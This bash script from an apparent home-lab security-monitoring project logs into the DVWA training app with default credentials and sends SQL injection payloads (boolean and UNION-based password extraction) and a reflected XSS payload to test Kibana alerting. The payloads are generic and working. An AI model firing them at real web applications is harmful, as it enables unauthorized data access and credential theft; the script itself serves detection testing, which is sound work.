#!/bin/bash
# Mini SOC — Red team attack #3: SQL injection + XSS against DVWA.
#
# DVWA must be set to Security: Low for these payloads to work.
# Prereq on the target: browse to http://<target>/setup.php → Create Database,
# then login admin/password and set DVWA Security → Low.
#
# Expected to light up:
#   • Apache access log on the DVWA container → soc-dvwa-* index
#   • Logstash tags 'soc.attack.web', sets soc.severity = critical
#
# Usage:  bash 03-sqli-dvwa.sh <target-ip>

set -euo pipefail

TARGET="${1:-}"
COOKIE_JAR="/tmp/mini-soc-dvwa.cookies"
BASE="http://${TARGET}"
USER="admin"
PASS="password"

if [[ -z "${TARGET}" ]]; then
  cat <<EOF >&2
Usage: $0 <target-ip>
Example: $0 10.10.10.20

Logs into DVWA and sends 3 malicious payloads:
  1. Classic boolean SQLi:   1' OR '1'='1
  2. UNION-based data dump:  1' UNION SELECT user,password FROM users-- -
  3. Reflected XSS:          <script>alert(1)</script>
EOF
  exit 1
fi

for cmd in curl grep; do
  command -v "${cmd}" >/dev/null 2>&1 || { echo "❌ ${cmd} not installed" >&2; exit 1; }
done

cat <<BANNER

╔══════════════════════════════════════════════════════════════════╗
║  ATTACK 3 — SQLi + XSS against DVWA                              ║
║  Target  : ${BASE}                                               ║
╚══════════════════════════════════════════════════════════════════╝

What to look for in Kibana:
  Index : soc-dvwa-*
  Tag   : soc.attack.web
  Field : soc.severity = critical
  Field : url.original contains UNION / OR 1=1 / <script>

BANNER

rm -f "${COOKIE_JAR}"

# 1) Fetch login page and pull the CSRF token.
echo "→ Fetching login page to grab CSRF token"
LOGIN_PAGE="$(curl -sS -c "${COOKIE_JAR}" "${BASE}/login.php")"
CSRF="$(printf '%s' "${LOGIN_PAGE}" | grep -oE "name='user_token' value='[a-f0-9]+'" | head -1 | grep -oE "[a-f0-9]{32}")"
if [[ -z "${CSRF:-}" ]]; then
  echo "⚠ Could not find CSRF token on login page — DVWA may not be initialized." >&2
  echo "  Browse to ${BASE}/setup.php and Create / Reset Database first." >&2
  exit 1
fi
echo "  token = ${CSRF}"

# 2) POST login.
echo "→ Logging in as ${USER}/${PASS}"
curl -sS -b "${COOKIE_JAR}" -c "${COOKIE_JAR}" \
  -X POST "${BASE}/login.php" \
  --data-urlencode "username=${USER}" \
  --data-urlencode "password=${PASS}" \
  --data-urlencode "Login=Login" \
  --data-urlencode "user_token=${CSRF}" \
  -o /dev/null
echo "  logged in"

send() {
  local label="$1"; shift
  local path="$1";  shift
  echo "→ ${label}"
  echo "  GET ${path}"
  curl -sS -b "${COOKIE_JAR}" "${BASE}${path}" -o /dev/null
}

# 3) Payloads. URL-encode them via curl's --data-urlencode-style quoting.
#    DVWA's SQLi page uses GET: /vulnerabilities/sqli/?id=<payload>&Submit=Submit

send "Payload 1 — boolean-based SQLi" \
     "/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271&Submit=Submit"

send "Payload 2 — UNION-based extraction" \
     "/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20user%2Cpassword%20FROM%20users--%20-&Submit=Submit"

send "Payload 3 — reflected XSS" \
     "/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C%2Fscript%3E"

echo
echo "✓ All three payloads sent. In Kibana:"
echo "    soc-dvwa-* → filter tags:soc.attack.web → you should see 3 events"
echo "    with url.original containing UNION, OR 1=1, or <script>."
